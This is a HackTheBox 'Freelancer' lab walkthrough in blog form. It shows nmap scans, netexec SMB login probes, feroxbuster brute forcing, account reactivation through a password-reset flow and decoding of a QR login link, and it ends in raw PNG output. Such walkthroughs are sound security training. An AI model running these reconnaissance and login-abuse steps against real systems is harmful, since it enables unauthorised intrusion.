@@ -1,0 +1,2087 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Freelancer</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-freelancer">htb-freelancer</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#netexec">netexec</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#django">django</a> <a class="post-tag" href="/tags#qrcode">qrcode</a> <a class="post-tag" href="/tags#zbarimg">zbarimg</a> <a class="post-tag" href="/tags#idor">idor</a> <a class="post-tag" href="/tags#mssql">mssql</a> <a class="post-tag" href="/tags#mssql-impersonate">mssql-impersonate</a> <a class="post-tag" href="/tags#password-spray">password-spray</a> <a class="post-tag" href="/tags#runascs">runascs</a> <a class="post-tag" href="/tags#memory-dump">memory-dump</a> <a class="post-tag" href="/tags#memprocfs">memprocfs</a> <a class="post-tag" href="/tags#lsa-secrets">lsa-secrets</a> <a class="post-tag" href="/tags#secretsdump">secretsdump</a> <a class="post-tag" href="/tags#bloodhound">bloodhound</a> <a class="post-tag" href="/tags#rbcd">rbcd</a> <a class="post-tag" href="/tags#windbg">windbg</a> <a class="post-tag" href="/tags#mimikatz">mimikatz</a> <a class="post-tag" href="/tags#mimilib">mimilib</a> <a class="post-tag" href="/tags#htb-support">htb-support</a> <a class="post-tag" href="/tags#htb-blackfield">htb-blackfield</a> <a class="post-tag" href="/tags#sebackupprivilege">sebackupprivilege</a> </span><br/><br/>
+<time class="dt-published" datetime="2024-10-05T13:45:00+00:00" itemprop="datePublished">Oct 5, 2024
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2024/10/05/htb-freelancer.html" style="color: #e6e6e6; text-decoration: none;">HTB: Freelancer</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/freelancer-cover.webp" type="image/webp"/>
+<img alt="Freelancer" class="include_image" loading="lazy" src="/img/freelancer-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Freelancer starts off by abusing the relationship between two Django websites, followed by abusing an insecure direct object reference in a QRcode login to get admin access. From there, I’ll use impersonation in the MSSQL database to run commands as the sa account, enabling xp_cmdshell and getting execution. I’ll find MSSQL passwords to pivot to the next user. This user has a memory dump which I’ll analyze with MemProcFS to find another password in LSA Secrets. Bloodhound shows this user is in a group with GenericWrite privileges over the DC, which I’ll abuse with resource-based constrained delegation to get domain hashes and a shell as administrator. In Beyond Root, I’ll show an altnerative path using WinDbg to on the dump to find another password, and spraying variations of it to get passwords for a bunch of users, some of whom are also in  the group with privileges necessary to exploit the DC.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/604 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/freelancer" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Freelancer</a> <a href="https://hackthebox.com/machines/freelancer" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-freelancer.webp" type="image/webp"/> <img alt="Freelancer" class="img-av" src="/icons/box-freelancer.png"/></picture></a><br/><a href="https://hackthebox.com/machines/freelancer" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1796157124055089191">01 Jun 2024</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">05 Oct 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/freelancer-diff.webp" type="image/webp"/><img alt="Rated difficulty for Freelancer" src="/img/freelancer-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/freelancer-radar.webp" type="image/webp"/><img alt="Radar chart for Freelancer" src="/img/freelancer-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:50:42</span><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:50:03</span><a href="https://app.hackthebox.com/users/260094" rel="noopener" target="_blank"><img alt="NLTE" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/260094" style="display: unset"/><span class="user-text" style="display: none"> NLTE</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/414823" rel="noopener" target="_blank"><img alt="Spectra199" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/414823" style="display: unset"/><span class="user-text" style="display: none"> Spectra199</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds many open TCP ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.5
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-05 12:00 EDT
+Nmap scan report for 10.10.11.5
+Host is up (0.10s latency).
+Not shown: 65509 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49674/tcp open  unknown
+49679/tcp open  unknown
+49698/tcp open  unknown
+55297/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49674,49679,49698,55297 <span class="nt">-sCV</span> 10.10.11.5
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-05 12:01 EDT
+Nmap scan report for 10.10.11.5
+Host is up (0.10s latency).
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   tcpwrapped
+80/tcp    open   http          nginx 1.25.5
+|_http-server-header: nginx/1.25.5
+|_http-title: Did not follow redirect to http://freelancer.htb/
+88/tcp    closed kerberos-sec
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds?
+464/tcp   closed kpasswd5
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49669/tcp open   msrpc         Microsoft Windows RPC
+49670/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open   msrpc         Microsoft Windows RPC
+49674/tcp open   msrpc         Microsoft Windows RPC
+49679/tcp open   msrpc         Microsoft Windows RPC
+49698/tcp open   tcpwrapped
+55297/tcp open   ms-sql-s      Microsoft SQL Server  15.00.2000.00
+| ms-sql-ntlm-info:
+|   Target_Name: FREELANCER
+|   NetBIOS_Domain_Name: FREELANCER
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: freelancer.htb
+|   DNS_Computer_Name: DC.freelancer.htb
+|   DNS_Tree_Name: freelancer.htb
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-06-06T00:23:48
+|_Not valid after:  2054-06-06T00:23:48
+|_ssl-date: 2024-06-06T00:29:03+00:00; +8h26m03s from scanner time.
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8h26m02s, deviation: 0s, median: 8h26m01s
+| ms-sql-info:
+|   Windows server name: DC
+|   10.10.11.5\SQLEXPRESS:
+|     Instance name: SQLEXPRESS
+|     Version:
+|       name: Microsoft SQL Server
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server
+|     TCP port: 55297
+|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
+|_    Clustered: false
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-06-06T00:28:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 192.34 seconds
+</span></code></pre></div></div>
+<p>The domain <code class="language-plaintext highlighter-rouge">freelancer.htb</code> and the hostname <code class="language-plaintext highlighter-rouge">dc</code> leak throughout the results. It’s interesting to see MSSQL running on 55297. There’s not much else here. I’ll triage the ports to enumerate as follows:</p>
+<ul>
+<li>Tier 1: HTTP (80), SMB (445)</li>
+<li>Tier 2: DNS, LDAP</li>
+<li>Tier 3: Kerberos brute force</li>
+<li>With creds: WinRM (5985), MSSQL (55297)</li>
+</ul>
+<p>I’ll try using <code class="language-plaintext highlighter-rouge">ffuf</code> to fuzz subdomains on the webserver (on 80), but it doesn’t find anything, and generates a lot of 503 (server unavailable) responses. I’ll add what I have so far to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.5 freelancer.htb dc.freelancer.htb dc
+</code></pre></div></div>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>The guest account is disabled, and junk accounts return <code class="language-plaintext highlighter-rouge">STATUS_LOGON_FAILURE</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logpurplefail">[-]</span><span class="go"> freelancer.htb\guest: STATUS_ACCOUNT_DISABLED 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\oxdf: STATUS_LOGON_FAILURE 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> oxdf <span class="nt">-p</span> junk
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\oxdf:junk STATUS_LOGON_FAILURE
+</span></code></pre></div></div>
+<p>Without auth, I’m not able to list shares or do anything else interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> Error getting user: list index out of range
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> Error enumerating shares: STATUS_USER_SESSION_DELETED
+</span></code></pre></div></div>
+<h3 id="freelancer---tcp-80">freelancer - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a jobs platform:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240607121244635.webp" type="image/webp"/>
+<img alt="image-20240607121244635" class="include_image" loading="lazy" src="/img/image-20240607121244635.png" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>There’s a signup for a newsletter link, but the submit button doesn’t send any HTTP requests. There’s an email address, <code class="language-plaintext highlighter-rouge">support@freelancer.htb</code>.</p>
+<p>There’s a lot to the site. Many of the features require login. There are two different registration forms, for both job seekers and employers.</p>
+<h4 id="employer-account">Employer Account</h4>
+<p>The form to register as a employer has this notice at the top:</p>
+<picture>
+<source srcset="/img/image-20240607133521310.webp" type="image/webp"/>
+<img alt="image-20240607133521310" class="include_image" loading="lazy" src="/img/image-20240607133521310.png"/>
+</picture>
+<p>In addition to name, email, username, the form also asks for security questions:</p>
+<picture>
+<source srcset="/img/image-20240607133636865.webp" type="image/webp"/>
+<img alt="image-20240607133636865" class="include_image" loading="lazy" src="/img/image-20240607133636865.png"/>
+</picture>
+<p>I’ll create an account, and when I try to log in, it fails:</p>
+<picture>
+<source srcset="/img/image-20240607133757801.webp" type="image/webp"/>
+<img alt="image-20240607133757801" class="include_image" loading="lazy" src="/img/image-20240607133757801.png"/>
+</picture>
+<p>I’ll need to figure out how to activate the account.</p>
+<h4 id="freelancer-account">Freelancer Account</h4>
+<p>I’ll register a freelancer account. I can’t use the same username or email I used with my employer account, as it’s already taken. I also need to provide security questions. On succeeding, I’m redirected to the login page, and on logging in, to <code class="language-plaintext highlighter-rouge">/job/search</code>:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240607134117210.webp" type="image/webp"/>
+<img alt="image-20240607134117210" class="include_image" loading="lazy" src="/img/image-20240607134117210.png" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>I’m able to view jobs, and clicking “Apply for job” just returns:</p>
+<picture>
+<source srcset="/img/image-20240607134225892.webp" type="image/webp"/>
+<img alt="image-20240607134225892" class="include_image" loading="lazy" src="/img/image-20240607134225892.png"/>
+</picture>
+<p>There’s a contact form on the authenticated site that does send data. It looks like it might be monitored, but some simple XSS payloads never contact me:</p>
+<picture>
+<source srcset="/img/image-20240607134346409.webp" type="image/webp"/>
+<img alt="image-20240607134346409" class="include_image" loading="lazy" src="/img/image-20240607134346409.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The headers don’t give much more information besides nginx:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.25.5</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 07 Jun 2024 21:12:10 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Cross-Origin-Opener-Policy</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">57293</span>
+</code></pre></div></div>
+<p>I’m not able to guess at any <code class="language-plaintext highlighter-rouge">index</code> extensions.</p>
+<p>The 404 page is custom to the site as well:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240607135341666.webp" type="image/webp"/>
+<img alt="image-20240607135341666" class="include_image" loading="lazy" src="/img/image-20240607135341666.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>Wappalyzer does identify the site as running the Python Django framework:</p>
+<picture>
+<source srcset="/img/image-20240607140516491.webp" type="image/webp"/>
+<img alt="image-20240607140516491" class="include_image" loading="lazy" src="/img/image-20240607140516491.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, but it doesn’t work well. It starts by showing a bunch of 503s, which it eventually starts filtering. Then there’s a ton of 302s. There’s a <code class="language-plaintext highlighter-rouge">/admin</code>, but everything inside <code class="language-plaintext highlighter-rouge">/admin/</code> seems to redirect to <code class="language-plaintext highlighter-rouge">http://freelancer.htb/admin/login/?next=/admin/[whatever]</code>. I’ll run again with <code class="language-plaintext highlighter-rouge">-n</code> to not recurse and <code class="language-plaintext highlighter-rouge">-C 503</code> to filter 503 responses, and the results are more useful:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-n</span> <span class="nt">-u</span> http://freelancer.htb <span class="nt">-C</span> 503
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://freelancer.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 💢  Status Code Filters   │ [503]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🚫  Do Not Recurse        │ true
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET      334l      690w    12238c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        0l        0w        0c http://freelancer.htb/admin =&gt; </span><span class="feroxbuster-yellow">http://freelancer.htb/admin/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     1247l     2523w    57293c http://freelancer.htb/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        0l        0w        0c http://freelancer.htb/blog =&gt; </span><span class="feroxbuster-yellow">http://freelancer.htb/blog/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     30000/30000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   205/s   http://freelancer.htb/
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/admin</code> is the interesting part. Visiting it just asks for auth again:</p>
+<picture>
+<source srcset="/img/image-20240607135101323.webp" type="image/webp"/>
+<img alt="image-20240607135101323" class="include_image" loading="lazy" src="/img/image-20240607135101323.png"/>
+</picture>
+<p>That login form looks very similar to the Django admin login form.</p>
+<h2 id="shell-as-sql_svc">Shell as sql_svc</h2>
+<h3 id="employer-site-access">Employer Site Access</h3>
+<h4 id="freelancer-login">Freelancer Login</h4>
+<p>The login form is an interesting area to attack on this site. There’s a shared login form for both the employer and freelancer accounts:</p>
+<picture>
+<source srcset="/img/image-20240607140715595.webp" type="image/webp"/>
+<img alt="image-20240607140715595" class="include_image" loading="lazy" src="/img/image-20240607140715595.png"/>
+</picture>
+<p>The “Forgot your password” link leads to a form asking the security questions:</p>
+<picture>
+<source srcset="/img/image-20240607140817623.webp" type="image/webp"/>
+<img alt="image-20240607140817623" class="include_image" loading="lazy" src="/img/image-20240607140817623.png"/>
+</picture>
+<p>It’s interesting that it says that answering the questions will reset the password <em>and</em> reactivate the account.</p>
+<h4 id="activate-employer-account">Activate Employer Account</h4>
+<p>I’ll use the “forgot password” form with the account I registered as an employer. On answering the questions correctly, it returns a password reset form:</p>
+<picture>
+<source srcset="/img/image-20240607141140315.webp" type="image/webp"/>
+<img alt="image-20240607141140315" class="include_image" loading="lazy" src="/img/image-20240607141140315.png"/>
+</picture>
+<p>After resetting the password, I’m able to log in as the employer:</p>
+<picture>
+<source srcset="/img/image-20240607141219855.webp" type="image/webp"/>
+<img alt="image-20240607141219855" class="include_image" loading="lazy" src="/img/image-20240607141219855.png"/>
+</picture>
+<h3 id="site-admin-access">Site Admin Access</h3>
+<h4 id="qr-code">QR-Code</h4>
+<p>There’s a QR-Code option on the left menu bar. Clicking it generates a short-lived QR-Code that can be used to login from a mobile device:</p>
+<picture>
+<source srcset="/img/image-20240607141330084.webp" type="image/webp"/>
+<img alt="image-20240607141330084" class="include_image" loading="lazy" src="/img/image-20240607141330084.png"/>
+</picture>
+<p>I’ll download the image and decode it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zbarimg qrcode.png 
+<span class="go">QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTA=/71c40e88da186a5d53afe78b585f1382/
+scanned 1 barcode symbols from 1 images in 0 seconds
+</span></code></pre></div></div>
+<p>Visiting that URL in a private browsing window (so no cookies from being logged in) immediately leads to my profile:</p>
+<picture>
+<source srcset="/img/image-20240607141728973.webp" type="image/webp"/>
+<img alt="image-20240607141728973" class="include_image" loading="lazy" src="/img/image-20240607141728973.png"/>
+</picture>
+<p>The HTTP response is a 302 redirect to <code class="language-plaintext highlighter-rouge">/accounts/profile/</code> that also sets the session cookie:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.25.5</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 07 Jun 2024 23:16:22 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cross-Origin-Opener-Policy</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">/accounts/profile/</span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">csrftoken=M9wSpEqf2qC0Dc9ChYwN0vA7kcE3Ixcm; expires=Fri, 06 Jun 2025 23:16:22 GMT; Max-Age=31449600; Path=/; SameSite=Lax</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">sessionid=uixwzlzp885e24ufsex32y88cs2v3oou; expires=Fri, 21 Jun 2024 23:16:22 GMT; HttpOnly; Max-Age=1209600; Path=/; SameSite=Lax</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Cookie</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
+</code></pre></div></div>
+<p>Visiting after 5 minutes returns:</p>
+<picture>
+<source srcset="/img/image-20240607141545250.webp" type="image/webp"/>
+<img alt="image-20240607141545250" class="include_image" loading="lazy" src="/img/image-20240607141545250.png"/>
+</picture>
+<p>The source for the qr-code is actually to a dynamic endpoint to generate qr-codes:</p>
+<picture>
+<source srcset="/img/image-20240607142256110.webp" type="image/webp"/>
+<img alt="image-20240607142256110" class="include_image" loading="lazy" src="/img/image-20240607142256110.png"/>
+</picture>
+<p>With the session cookie, it can be downloaded directly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl http://freelancer.htb/accounts/otp/qrcode/generate/ <span class="nt">-b</span> <span class="s1">'sessionid=uixwzlzp885e24ufsex32y88cs2v3oou'</span> <span class="nt">-o-</span>
+<span class="go">PNG
+
+IHDRTcIDATx]8FOyt.`fR
+                     c7R'f4=J*U2kE
+                                  2 
+                                    2 
+` O`1@M7d'yKK76c;f߉TPaMeg       X2Obxt-hoIAޝ OXsXH3
+izgȞ:+mQmˇ&lt;XAZU?.P˖ l(6ߴՌ!l(Ƚ܆Z쌚           ~=  _3I=n|*Ω&amp;@b}AG/jH$IIҘ$Q-3z%IRZ\I껙:WFh&gt;Aޏl~9$w&lt;:4ZSP;X6;K j9 d'N'IV^dSO
+                                 jQ
